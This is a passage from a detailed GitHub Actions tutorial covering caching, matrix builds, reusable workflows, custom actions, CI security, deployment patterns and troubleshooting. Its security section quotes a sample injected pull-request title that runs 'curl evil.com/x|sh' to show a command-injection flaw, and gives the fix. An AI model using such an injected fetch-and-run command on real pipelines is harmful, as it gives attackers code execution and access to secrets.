# Download by pattern and merge (useful with matrix)
- uses: actions/download-artifact@v8
  with:
    pattern: build-*
    merge-multiple: true
```

Notes: artifact names must be unique within a run — with a matrix, include the matrix values in the name. There's a limit of 500 artifacts per job. To fetch an artifact from a *different* workflow run you need the API or a third-party action.

Always upload test reports even on failure:

```yaml
- uses: actions/upload-artifact@v7
  if: always()
  with:
    name: test-results
    path: reports/
```

### Caching

Most `setup-*` actions have caching built in — use that first:

```yaml
- uses: actions/setup-node@v7
  with:
    node-version: '22'
    cache: 'npm'              # or yarn, pnpm

- uses: actions/setup-python@v6
  with:
    python-version: '3.12'
    cache: 'pip'

- uses: actions/setup-java@v5
  with:
    distribution: 'temurin'
    java-version: '21'
    cache: 'maven'
```

Manual control with `actions/cache`:

```yaml
- uses: actions/cache@v5
  id: cache-deps
  with:
    path: |
      ~/.npm
      .next/cache
    key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
    restore-keys: |
      ${{ runner.os }}-node-

- if: steps.cache-deps.outputs.cache-hit != 'true'
  run: npm ci
```

**Key design is the whole game.**

- `key` must change whenever the cached content should change → embed `hashFiles()` of your lockfile.
- Include `runner.os` (and arch, and language version) so a Linux cache never lands on Windows.
- `restore-keys` are *prefix* fallbacks, tried in order. A partial hit gives you a stale-but-useful cache that npm/pip will then top up.
- Caches are **immutable**. A key that already exists is never overwritten — that's why the key must contain the hash.

Split restore/save when you need to save only on success:

```yaml
- uses: actions/cache/restore@v5
  id: restore
  with:
    path: ~/.cache
    key: ${{ runner.os }}-${{ hashFiles('lock') }}
# ... work ...
- uses: actions/cache/save@v5
  if: always() && steps.restore.outputs.cache-hit != 'true'
  with:
    path: ~/.cache
    key: ${{ runner.os }}-${{ hashFiles('lock') }}
```

**Cache scoping:** a branch can read caches created on itself, on its base branch, and on the default branch — but not on sibling branches. So caches created on `main` are shared with everyone; caches created on `feature/x` are private to it.

**Never cache secrets or credentials.** Cache contents are readable by any workflow in the repo, including from PR branches.

---

## 13. Matrix builds

Run the same job across many combinations.

```yaml
jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false          # don't cancel siblings when one fails
      max-parallel: 4
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        node: [20, 22, 24]
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-node@v7
        with:
          node-version: ${{ matrix.node }}
      - run: npm ci && npm test
```

That's 3 × 3 = 9 jobs, running in parallel. Set `fail-fast: false` while debugging so you see *all* failures, not just the first.

### Include and exclude

```yaml
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest]
        node: [20, 22, 24]
        exclude:
          - os: windows-latest
            node: 20                 # remove this combination
        include:
          - os: ubuntu-latest        # add an extra variable to a combo
            node: 24
            experimental: true
          - os: macos-latest         # add a whole new combination
            node: 24
```

`exclude` runs first, then `include`. An `include` entry that matches an existing combination *adds variables* to it; one that doesn't creates a new job.

### Dynamic matrices

Generate the matrix at runtime — very useful for monorepos:

```yaml
jobs:
  discover:
    runs-on: ubuntu-latest
    outputs:
      packages: ${{ steps.find.outputs.packages }}
    steps:
      - uses: actions/checkout@v7
      - id: find
        run: |
          PKGS=$(ls packages | jq -R -s -c 'split("\n")[:-1]')
          echo "packages=$PKGS" >> "$GITHUB_OUTPUT"

  build:
    needs: discover
    runs-on: ubuntu-latest
    strategy:
      matrix:
        package: ${{ fromJSON(needs.discover.outputs.packages) }}
    steps:
      - run: echo "Building ${{ matrix.package }}"
```

Matrix limit: 256 jobs per workflow run.

---

## 14. Reusable workflows and composite actions

Once you have more than a couple of repos, copy-pasting YAML stops scaling. Two mechanisms:

| | **Reusable workflow** | **Composite action** |
|---|---|---|
| Granularity | Whole jobs | A group of steps |
| Location | `.github/workflows/*.yml` | any dir with `action.yml` |
| Can specify `runs-on` | Yes | No (inherits caller's) |
| Can use `secrets:` / `environment:` | Yes | No |
| Called from | `jobs.<id>.uses` | `steps[*].uses` |
| Nesting depth | 4 levels | 10 levels |

### Reusable workflow

`.github/workflows/reusable-deploy.yml`:

```yaml
name: Reusable Deploy

on:
  workflow_call:
    inputs:
      environment:
        required: true
        type: string
      version:
        required: false
        type: string
        default: 'latest'
    secrets:
      DEPLOY_TOKEN:
        required: true
    outputs:
      url:
        description: 'Deployed URL'
        value: ${{ jobs.deploy.outputs.url }}

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}
    outputs:
      url: ${{ steps.d.outputs.url }}
    steps:
      - uses: actions/checkout@v7
      - id: d
        run: |
          ./deploy.sh --version "${{ inputs.version }}"
          echo "url=https://${{ inputs.environment }}.myapp.com" >> "$GITHUB_OUTPUT"
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
```

Caller:

```yaml
jobs:
  staging:
    uses: ./.github/workflows/reusable-deploy.yml
    with:
      environment: staging
      version: ${{ github.sha }}
    secrets:
      DEPLOY_TOKEN: ${{ secrets.STAGING_TOKEN }}

  production:
    needs: staging
    uses: myorg/shared-workflows/.github/workflows/deploy.yml@v1
    with:
      environment: production
    secrets: inherit          # pass ALL caller secrets — convenient, less safe
```

Constraints: a called workflow is a *job*, so it can't have `steps` alongside `uses`. `env` from the caller isn't inherited. Max 20 unique reusable workflows per run.

### Composite action

`.github/actions/setup-project/action.yml`:

```yaml
name: 'Setup Project'
description: 'Checkout, install Node, install deps'

inputs:
  node-version:
    description: 'Node version'
    required: false
    default: '22'

outputs:
  cache-hit:
    description: 'Whether deps were cached'
    value: ${{ steps.deps.outputs.cache-hit }}

runs:
  using: 'composite'
  steps:
    - uses: actions/setup-node@v7
      with:
        node-version: ${{ inputs.node-version }}
        cache: 'npm'
    - id: deps
      shell: bash            # REQUIRED for every `run` in a composite action
      run: npm ci
```

Use it:

```yaml
steps:
  - uses: actions/checkout@v7
  - uses: ./.github/actions/setup-project
    with:
      node-version: '24'
```

The `shell:` requirement on every `run` step is the #1 error people hit here.

### Organization-level starter workflows

Put templates in a repo named `.github` under `workflow-templates/`, with a `name.yml` and a `name.properties.json`. They then appear as suggestions when anyone in the org creates a new workflow.

---

## 15. Writing your own action

Three types:

### 1. Composite — YAML steps

Covered above. Start here; it covers most needs with no build step.

### 2. JavaScript / TypeScript action

`action.yml`:

```yaml
name: 'Greet'
description: 'Says hello'
inputs:
  who:
    description: 'Who to greet'
    required: true
    default: 'World'
outputs:
  time:
    description: 'When it ran'
runs:
  using: 'node24'
  main: 'dist/index.js'
  post: 'dist/cleanup.js'      # optional: always runs at job end
branding:
  icon: 'activity'
  color: 'green'
```

`index.js`:

```javascript
const core = require('@actions/core');
const github = require('@actions/github');

async function run() {
  try {
    const who = core.getInput('who', { required: true });
    core.info(`Hello, ${who}!`);
    core.setOutput('time', new Date().toISOString());

    core.debug('only shown with ACTIONS_STEP_DEBUG');
    core.warning('a warning annotation');
    core.setSecret(someValue);            // mask in logs
    core.summary.addHeading('Done').write();

    const token = core.getInput('token');
    const octokit = github.getOctokit(token);
    // octokit.rest.issues.createComment({...})
  } catch (error) {
    core.setFailed(error.message);
  }
}
run();
```

You must **commit the bundled output** (`dist/`) because GitHub doesn't run `npm install` for you. Use `@vercel/ncc`: `ncc build index.js -o dist`.

Fastest startup of the three types. Runs on any runner OS.

### 3. Docker container action

```yaml
runs:
  using: 'docker'
  image: 'Dockerfile'          # or 'docker://ghcr.io/org/img:tag'
  args:
    - ${{ inputs.who }}
  env:
    TOKEN: ${{ inputs.token }}
```

Any language, full control over dependencies. Linux runners only, and slower (image build/pull each run). Pre-publishing the image to a registry avoids the build cost.

### Publishing

Tag releases with semver (`v1.2.3`) and also maintain a moving major tag (`v1`) so consumers can pin `@v1` and get patches. Publish to the Marketplace from the release page if you want discoverability.

---

## 16. Security

CI systems are a prime supply-chain target: they hold production credentials and execute code automatically.

### 1. Least-privilege `GITHUB_TOKEN`

```yaml
permissions:
  contents: read              # workflow default: read-only

jobs:
  release:
    permissions:
      contents: write         # widen only where needed
      packages: write
```

Also set the org/repo default to read-only: Settings → Actions → Workflow permissions.

### 2. Pin third-party actions to a full SHA

```yaml
# Risky: tags are mutable — the owner (or an attacker) can move v1 anywhere
- uses: some-org/some-action@v1

# Safe: immutable commit
- uses: some-org/some-action@e3b0c44298fc1c149afbf4c8996fb924  # v1.2.3
```

This is not paranoia. Multiple real supply-chain incidents have involved compromised popular actions with retagged versions. Use Dependabot (`package-ecosystem: "github-actions"`) to keep the pins current, and prefer `actions/*` and verified creators. Consider restricting which actions may run at all: Settings → Actions → "Allow select actions."

### 3. Never interpolate untrusted input into `run`

This is remote code execution:

```yaml
# DANGEROUS — a PR titled  a"; curl evil.com/x|sh; #  runs on your runner
- run: echo "Title: ${{ github.event.pull_request.title }}"
```

Because `${{ }}` is substituted into the script *before* bash sees it. Fix by passing through the environment, where it's just data:

```yaml
- run: echo "Title: $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```

Untrusted fields include: issue/PR titles and bodies, comment bodies, branch names, commit messages, author names, review bodies, and anything under `github.event.*.body`.

### 4. Understand `pull_request` vs `pull_request_target`

| | `pull_request` | `pull_request_target` |
|---|---|---|
| Code checked out | PR head (untrusted) | Base branch (trusted) |
| Secrets available | No (for forks) | **Yes** |
| Token | Read-only for forks | Read-write |

`pull_request_target` runs *trusted* workflow code with *full* privileges — so if you check out and execute the fork's code inside it, an attacker gets your secrets. This is the "pwn request" vulnerability. As of 2026, `actions/checkout` **refuses fork-PR checkouts by default** in `pull_request_target` and `workflow_run` workflows; there's an `allow-unsafe-pr-checkout: true` opt-out, and if you find yourself reaching for it, redesign instead. Enforcement was backported to earlier majors, so old workflows relying on this pattern will now break — that's intentional.

Safe pattern: use `pull_request` for building/testing PR code (no secrets), and a separate `workflow_run` job for anything privileged, which downloads artifacts rather than executing PR code.

### 5. OIDC instead of long-lived cloud keys

Stop storing `AWS_SECRET_ACCESS_KEY` in GitHub. Use short-lived tokens via OpenID Connect:

```yaml
permissions:
  id-token: write         # required
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: aws-actions/configure-aws-credentials@v5
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubDeploy
          aws-region: us-east-1
      - run: aws s3 sync ./dist s3://my-bucket
```

On the cloud side, create a trust policy that only accepts tokens from your repo and (importantly) restricts the `sub` claim to a specific branch or **environment**:

```json
"Condition": {
  "StringEquals": {
    "token.actions.githubusercontent.com:sub":
      "repo:myorg/myrepo:environment:production"
  }
}
```

Now the production role is only assumable from a job targeting the `production` environment — which requires approval. Environments and OIDC compose into a genuinely strong control. Equivalent support exists for Azure (`azure/login`), GCP (`google-github-actions/auth`), and HashiCorp Vault.

### 6. Other essentials

- **Fork PR approval:** Settings → Actions → require approval for first-time or all outside contributors.
- **Never echo secrets**, and don't pass them as CLI args (visible in process lists on self-hosted runners).
- **Enable secret scanning + push protection** so a leaked key gets caught at push time.
- **Scan dependencies and containers in CI** (`npm audit`, Trivy, CodeQL).
- **Sign or attest artifacts** — GitHub's artifact attestation (`actions/attest-build-provenance`) gives you SLSA provenance.
- **Rotate any secret that appears in a log**, immediately. Assume it's compromised.
- **No self-hosted runners on public repos.**
- **Review the audit log** for workflow and environment changes.

---

## 17. Deployment patterns

### Standard promotion (build once, promote)

`dev` → `staging` → `production`, each a GitHub environment, each stricter than the last. Production has required reviewers and a branch policy of `main` only. Covered fully in [section 11](#11-environments--the-deep-dive).

### Manual approval gate

Just add required reviewers to the environment. Don't build custom "wait for comment" mechanisms — the built-in gate is auditable and integrates with notifications.

### PR preview environments

```yaml
name: Preview

on:
  pull_request:
    types: [opened, synchronize, reopened, closed]

jobs:
  deploy-preview:
    if: github.event.action != 'closed'
    runs-on: ubuntu-latest
    environment:
      name: pr-${{ github.event.number }}
      url: ${{ steps.deploy.outputs.url }}
    permissions:
      contents: read
      pull-requests: write
    steps:
      - uses: actions/checkout@v7
      - id: deploy
        run: |
          URL="https://pr-${{ github.event.number }}.preview.example.com"
          ./deploy-preview.sh "$URL"
          echo "url=$URL" >> "$GITHUB_OUTPUT"
      - run: gh pr comment ${{ github.event.number }} --body "Preview: ${{ steps.deploy.outputs.url }}"
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}

  teardown:
    if: github.event.action == 'closed'
    runs-on: ubuntu-latest
    steps:
      - run: ./destroy-preview.sh pr-${{ github.event.number }}
```

Remember: PRs from forks get no secrets, so preview deploys for external contributors need the `workflow_run` split.

### Blue/green

Deploy to the idle colour, verify it, then flip the router. Rollback is flipping back — near-instant.

```yaml
- name: Deploy to idle slot
  run: ./deploy.sh --slot "$IDLE"
- name: Verify idle slot
  run: curl -fsS "https://$IDLE.internal/health"
- name: Swap traffic
  run: ./swap-slots.sh
- name: Rollback on failure
  if: failure()
  run: ./swap-slots.sh --revert
```

### Canary

Send a small traffic percentage to the new version, watch metrics, ramp up.

```yaml
- run: ./deploy.sh --canary --weight 5
- run: sleep 300 && ./check-metrics.sh --max-error-rate 0.01
- run: ./deploy.sh --canary --weight 50
- run: sleep 300 && ./check-metrics.sh --max-error-rate 0.01
- run: ./deploy.sh --promote
- if: failure()
  run: ./deploy.sh --abort-canary
```

A wait timer on the environment is a low-tech version of the soak period.

### Rollback

Make rollback a first-class, boring operation — a `workflow_dispatch` workflow that takes a version and redeploys that artifact. Test it. The worst time to discover your rollback path is broken is during an incident.

### Release on tag

```yaml
on:
  push:
    tags: ['v*.*.*']

jobs:
  release:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v7
      - run: make build
      - uses: softprops/action-gh-release@v3
        with:
          files: dist/*
          generate_release_notes: true
```

### GitOps

Actions builds and pushes the image, then commits a new tag into a manifests repo. Argo CD or Flux reconciles the cluster. Actions never touches the cluster directly, which is a cleaner security boundary.

---

## 18. Complete real-world examples

### A. Full Node.js CI/CD with Docker and OIDC

```yaml
name: CI/CD

on:
  push:
    branches: [main]
  pull_request:

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

permissions:
  contents: read

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}

jobs:
  quality:
    name: Lint & typecheck
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-node@v7
        with:
          node-version: '22'
          cache: 'npm'
      - run: npm ci
      - run: npm run lint
      - run: npm run typecheck

  test:
    name: Test (node ${{ matrix.node }})
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        node: [20, 22, 24]
    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_PASSWORD: postgres
        ports: ['5432:5432']
        options: >-
          --health-cmd pg_isready --health-interval 10s
          --health-timeout 5s --health-retries 5
    env:
      DATABASE_URL: postgres://postgres:postgres@localhost:5432/postgres
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-node@v7
        with:
          node-version: ${{ matrix.node }}
          cache: 'npm'
      - run: npm ci
      - run: npm run test:ci
      - uses: actions/upload-artifact@v7
        if: always()
        with:
          name: coverage-node${{ matrix.node }}
          path: coverage/

  build-image:
    name: Build & push image
    needs: [quality, test]
    if: github.event_name == 'push'
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
      id-token: write
      attestations: write
    outputs:
      digest: ${{ steps.push.outputs.digest }}
      tags: ${{ steps.meta.outputs.tags }}
    steps:
      - uses: actions/checkout@v7

      - uses: docker/setup-buildx-action@v3

      - uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - id: meta
        uses: docker/metadata-action@v5
        with:
          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          tags: |
            type=sha,format=long
            type=ref,event=branch
            type=semver,pattern={{version}}
            type=raw,value=latest,enable={{is_default_branch}}

      - id: push
        uses: docker/build-push-action@v6
        with:
          context: .
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

      - uses: actions/attest-build-provenance@v3
        with:
          subject-name: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          subject-digest: ${{ steps.push.outputs.digest }}
          push-to-registry: true

  deploy-staging:
    needs: build-image
    runs-on: ubuntu-latest
    environment:
      name: staging
      url: https://staging.example.com
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@v5
        with:
          role-to-assume: ${{ vars.AWS_ROLE_ARN }}
          aws-region: ${{ vars.AWS_REGION }}
      - run: |
          aws ecs update-service \
            --cluster ${{ vars.ECS_CLUSTER }} \
            --service ${{ vars.ECS_SERVICE }} \
            --force-new-deployment
      - run: |
          aws ecs wait services-stable \
            --cluster ${{ vars.ECS_CLUSTER }} \
            --services ${{ vars.ECS_SERVICE }}
      - run: curl -fsS https://staging.example.com/health

  deploy-production:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment:
      name: production           # required reviewers configured in Settings
      url: https://example.com
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@v5
        with:
          role-to-assume: ${{ vars.AWS_ROLE_ARN }}
          aws-region: ${{ vars.AWS_REGION }}
      - run: |
          aws ecs update-service \
            --cluster ${{ vars.ECS_CLUSTER }} \
            --service ${{ vars.ECS_SERVICE }} \
            --force-new-deployment
      - run: |
          aws ecs wait services-stable \
            --cluster ${{ vars.ECS_CLUSTER }} \
            --services ${{ vars.ECS_SERVICE }}
      - name: Summary
        run: |
          echo "### Deployed to production 🚀" >> "$GITHUB_STEP_SUMMARY"
          echo "Digest: \`${{ needs.build-image.outputs.digest }}\`" >> "$GITHUB_STEP_SUMMARY"
```

### B. Python package: test, build, publish to PyPI

```yaml
name: Python Package

on:
  push:
    branches: [main]
    tags: ['v*']
  pull_request:

permissions:
  contents: read

jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, macos-latest, windows-latest]
        python: ['3.11', '3.12', '3.13']
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-python@v6
        with:
          python-version: ${{ matrix.python }}
          cache: 'pip'
      - run: pip install -e '.[test]'
      - run: pytest --cov --cov-report=xml
      - uses: codecov/codecov-action@v5
        with:
          token: ${{ secrets.CODECOV_TOKEN }}

  build:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-python@v6
        with:
          python-version: '3.12'
      - run: pip install build && python -m build
      - uses: actions/upload-artifact@v7
        with:
          name: dist
          path: dist/

  publish:
    needs: build
    if: startsWith(github.ref, 'refs/tags/v')
    runs-on: ubuntu-latest
    environment:
      name: pypi
      url: https://pypi.org/project/my-package/
    permissions:
      id-token: write            # PyPI trusted publishing — no API token!
    steps:
      - uses: actions/download-artifact@v8
        with:
          name: dist
          path: dist/
      - uses: pypa/gh-action-pypi-publish@release/v1
```

### C. Static site to GitHub Pages

```yaml
name: Deploy Pages

on:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: read
  pages: write
  id-token: write

concurrency:
  group: pages
  cancel-in-progress: false

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-node@v7
        with:
          node-version: '22'
          cache: 'npm'
      - run: npm ci && npm run build
      - uses: actions/configure-pages@v5
      - uses: actions/upload-pages-artifact@v4
        with:
          path: ./dist

  deploy:
    needs: build
    runs-on: ubuntu-latest
    environment:
      name: github-pages          # GitHub creates this automatically
      url: ${{ steps.deployment.outputs.page_url }}
    steps:
      - id: deployment
        uses: actions/deploy-pages@v4
```

### D. Terraform plan on PR, apply on merge

```yaml
name: Terraform

on:
  pull_request:
    paths: ['infra/**']
  push:
    branches: [main]
    paths: ['infra/**']

permissions:
  contents: read

defaults:
  run:
    working-directory: ./infra

jobs:
  plan:
    if: github.event_name == 'pull_request'
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: write
      id-token: write
    steps:
      - uses: actions/checkout@v7
      - uses: aws-actions/configure-aws-credentials@v5
        with:
          role-to-assume: ${{ vars.TF_PLAN_ROLE }}    # read-only role
          aws-region: us-east-1
      - uses: hashicorp/setup-terraform@v3
      - run: terraform fmt -check
      - run: terraform init
      - run: terraform validate
      - id: plan
        run: terraform plan -no-color -out=tfplan 2>&1 | tail -n 100
      - uses: actions/github-script@v8
        with:
          script: |
            const out = `#### Terraform Plan
            \`\`\`
            ${{ steps.plan.outputs.stdout }}
            \`\`\``;
            github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: out
            });

  apply:
    if: github.event_name == 'push'
    runs-on: ubuntu-latest
    environment: infrastructure     # required reviewers!
    permissions:
      contents: read
      id-token: write
    steps:
      - uses: actions/checkout@v7
      - uses: aws-actions/configure-aws-credentials@v5
        with:
          role-to-assume: ${{ vars.TF_APPLY_ROLE }}   # write role
          aws-region: us-east-1
      - uses: hashicorp/setup-terraform@v3
      - run: terraform init
      - run: terraform apply -auto-approve
```

---

## 19. Debugging and troubleshooting

### Enable debug logging

Set these as repository **variables** or secrets:

- `ACTIONS_STEP_DEBUG` = `true` — verbose step logs
- `ACTIONS_RUNNER_DEBUG` = `true` — runner diagnostic logs

Or use "Re-run jobs → Enable debug logging" in the UI for a one-off.

### Inspect the environment

```yaml
- name: Dump contexts
  env:
    GITHUB_CONTEXT: ${{ toJSON(github) }}
    JOB_CONTEXT: ${{ toJSON(job) }}
    NEEDS_CONTEXT: ${{ toJSON(needs) }}
    MATRIX_CONTEXT: ${{ toJSON(matrix) }}
  run: |
    echo "$GITHUB_CONTEXT"
    echo "$JOB_CONTEXT"
    echo "$NEEDS_CONTEXT"
    echo "$MATRIX_CONTEXT"

- name: Inspect runner
  run: |
    pwd && ls -la
    env | sort
    df -h
    node --version && python3 --version && docker --version
```

### Interactive SSH debugging

```yaml
- uses: mxschmitt/action-tmate@v3
  if: failure()
  timeout-minutes: 15
```

Gives you a shell on the runner. Extremely useful, but **never on a repo with real secrets in scope** — the session URL is in the public log.

### Run workflows locally

`nektos/act` runs workflows in Docker on your machine:

```bash
act -l                              # list jobs
act push                            # simulate a push event
act -j test                         # run one job
act --secret-file .secrets          # provide secrets
act -e event.json                   # custom event payload
```

It's an approximation, not an emulator — service containers, OIDC, and environments behave differently. Good for iterating on shell logic, not for verifying gates.

### Lint before pushing

```bash
# actionlint catches YAML errors, bad expressions, shellcheck issues
actionlint
```

Add it to CI:

```yaml
- uses: reviewdog/action-actionlint@v1
```

### Symptom → cause table

| Symptom | Likely cause |
|---|---|
| "file not found" in first real step | Missing `actions/checkout` |
| Workflow doesn't run at all | File not in `.github/workflows/`, YAML invalid, path/branch filter excludes it, or Actions disabled for the repo |
| Secret is empty | PR from a fork; wrong scope; typo; or the secret is environment-scoped but the job has no `environment:` |
| `Resource not accessible by integration` | `GITHUB_TOKEN` lacks a permission scope |
| Variable set in a step isn't visible | Wrote to `$GITHUB_ENV` and read it in the *same* step |
| Cache never hits | Key includes something that changes every run (e.g. `github.sha`) |
| Cron never fires | Workflow not on the default branch, or repo inactive 60+ days |
| Job waits forever | Environment approval pending, or concurrency queue |
| Works locally, fails in CI | Uncommitted file, case-sensitive filesystem, missing env var, or a different tool version |
| Matrix jobs overwrite each other's artifacts | Artifact name not unique per matrix combination |
| Expression prints literally as `${{ ... }}` | Inside single quotes in YAML, or in a file the runner doesn't interpolate |

### Reading the run

The Actions tab → run → job → step. Use the search box in the log view. Download the full log archive (gear icon) for grepping. Re-run individual failed jobs rather than the whole workflow to save minutes.

---

## 20. Performance and cost

**Measure first.** The run page shows per-job duration; billing shows per-workflow minutes. Optimise the top item, not everything.

### Speed

1. **Cache dependencies.** Usually the single biggest win.
2. **Parallelise.** Split lint/test/build into separate jobs; shard a big test suite across a matrix.
3. **Fail fast.** Cheap checks first, in a job the expensive ones `needs`.
4. **Skip unnecessary work.** `paths` filters, and `dorny/paths-filter` for monorepos.
5. **Use `ubuntu-latest`.** Fastest and cheapest unless you need another OS.
6. **Shallow clone.** `fetch-depth: 1` is the default; only set `0` when you truly need history.
7. **`npm ci` not `npm install`**; use `--frozen-lockfile` equivalents.
8. **Docker layer caching** via `cache-from: type=gha`.
9. **`cancel-in-progress`** on PR branches — don't pay for runs nobody will look at.
10. **Trim the container** if you use `container:` — smaller images pull faster.

### Cost

- Public repos: free minutes on GitHub-hosted runners.
- Private: watch the multipliers. Linux 1×, Windows 2×, macOS 10×. Move anything that doesn't need Windows/macOS to Linux.
- Billed minutes round **up to the nearest minute per job**. Many tiny jobs cost more than a few merged ones.
- Set `timeout-minutes` on every job so a hung process can't burn six hours.
- Storage is billed too: lower `retention-days` on large artifacts.
- Consider self-hosted or larger runners once you're at sustained high volume.

---

## 21. Common pitfalls

1. **Forgetting `actions/checkout`.** The runner starts empty.
2. **Expecting state between jobs.** Every job is a new machine. Use artifacts/outputs/cache.
3. **Interpolating untrusted input into `run:`.** Command injection. Use `env:`.
4. **Using tags for third-party actions.** Pin SHAs for anything you don't control.
5. **Overly broad `permissions`.** Start read-only, widen deliberately.
6. **Cache keys without a lockfile hash.** Either never hit, or serve stale deps forever.
7. **Rebuilding per environment.** Build once, promote the artifact.
8. **`cancel-in-progress: true` on production deploys.** Half-deployed states.
9. **No `timeout-minutes`.** A hung job runs for 6 hours by default.
10. **Secrets in `if:` conditions or logs.** Check emptiness via env vars; never echo.
11. **Not setting `fail-fast: false`** while debugging a matrix — you only see one failure.
12. **Non-unique artifact names in a matrix.** Include `matrix.*` in the name.
13. **Expecting `GITHUB_TOKEN` commits to trigger workflows.** They don't, by design.
14. **Skipping `shell:` in composite action `run` steps.** It's mandatory.
15. **Assuming cron is punctual.** It's best-effort with real delays.
16. **Environment secrets without `environment:` on the job.** They simply won't resolve.
17. **Using `pull_request_target` with a fork checkout.** Now blocked by default; don't work around it.
18. **Tabs in YAML.** Illegal.
19. **Unquoted version numbers.** `node-version: 20.10` is a float.
20. **Treating a green pipeline as proof of quality.** Green means the checks you wrote passed. Write good checks.

---

## 22. Cheat sheet

### Minimal workflow

```yaml
name: CI
on: [push, pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - run: make test
```

### Common actions (majors current as of Aug 2026 — verify before use)

```yaml
actions/checkout@v7
actions/setup-node@v7
actions/setup-python@v6
actions/setup-java@v5
actions/setup-go@v6
actions/cache@v5
actions/upload-artifact@v7
actions/download-artifact@v8
actions/github-script@v8
actions/attest-build-provenance@v3
docker/setup-buildx-action@v3
docker/login-action@v3
docker/build-push-action@v6
docker/metadata-action@v5
aws-actions/configure-aws-credentials@v5
azure/login@v2
google-github-actions/auth@v2
softprops/action-gh-release@v3
peter-evans/create-pull-request@v7
```

### Expressions

```yaml
${{ github.ref_name }}
${{ github.event_name == 'push' }}
${{ secrets.MY_SECRET }}
${{ vars.MY_VAR }}
${{ needs.build.outputs.version }}
${{ steps.step_id.outputs.value }}
${{ matrix.node }}
${{ inputs.environment }}
${{ runner.os }}
${{ contains(github.ref, 'release') }}
${{ hashFiles('**/package-lock.json') }}
${{ toJSON(github.event) }}
${{ fromJSON(needs.x.outputs.json) }}
${{ github.ref == 'refs/heads/main' && 'prod' || 'dev' }}
```

### Step communication

```bash
echo "key=value" >> "$GITHUB_OUTPUT"       # step output
echo "KEY=value" >> "$GITHUB_ENV"          # env for later steps
echo "/path/bin" >> "$GITHUB_PATH"         # PATH for later steps
echo "## Summary" >> "$GITHUB_STEP_SUMMARY" # run-page markdown
echo "::add-mask::$val"                    # redact from logs
echo "::error file=a.js,line=1::message"   # annotation
```

### Conditions

```yaml
if: github.ref == 'refs/heads/main'
if: github.event_name == 'pull_request'
if: startsWith(github.ref, 'refs/tags/')
if: success() / failure() / cancelled() / always()
if: "!cancelled()"
if: contains(github.event.pull_request.labels.*.name, 'deploy')
```

### Environment block

```yaml
environment:
  name: production
  url: https://example.com
```

### Boilerplate for a well-behaved workflow

```yaml
name: Pipeline
on:
  push: { branches: [main] }
  pull_request:
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
permissions:
  contents: read
jobs:
  job:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v7
```

### Useful `gh` commands

```bash
gh workflow list
gh workflow run deploy.yml -f environment=staging
gh run list --workflow=ci.yml --limit 10
gh run view <run-id> --log
gh run watch
gh run rerun <run-id> --failed
gh run cancel <run-id>
gh secret set NAME --env production
gh variable set NAME --body value
gh api repos/:owner/:repo/environments
```

### Key limits

| Thing | Limit |
|---|---|
| Job runtime | 6 h (default `timeout-minutes: 360`) |
| Workflow run | 35 days |
| Matrix jobs | 256 per run |
| Reusable workflows | 20 per run, 4 levels deep |
| Job outputs | 1 MB total |
| Secret size | 48 KB |
| Cache | 10 GB per repo, 7-day unused eviction |
| Artifact retention | 1–90 days |
| Required reviewers | 6 per environment |
| Wait timer | 43,200 min (30 days) |
| Concurrent jobs | plan-dependent (20 on Free) |

---

## 23. Learning path and exercises

### Week 1 — Basics

- [ ] Create a repo with a `hello-world.yml` that echoes on push.
- [ ] Add checkout + a language setup action + a real test command.
- [ ] Add branch and path filters; verify a docs-only commit doesn't trigger it.
- [ ] Add a `workflow_dispatch` trigger with a `choice` input and run it from the UI.
- [ ] Deliberately break a step and read the failure log.

### Week 2 — Structure

- [ ] Split into three jobs: `lint`, `test`, `build`, wired with `needs`.
- [ ] Pass a version string from one job to another via job outputs.
- [ ] Upload a build artifact and download it in a later job.
- [ ] Add dependency caching and compare run times before/after.
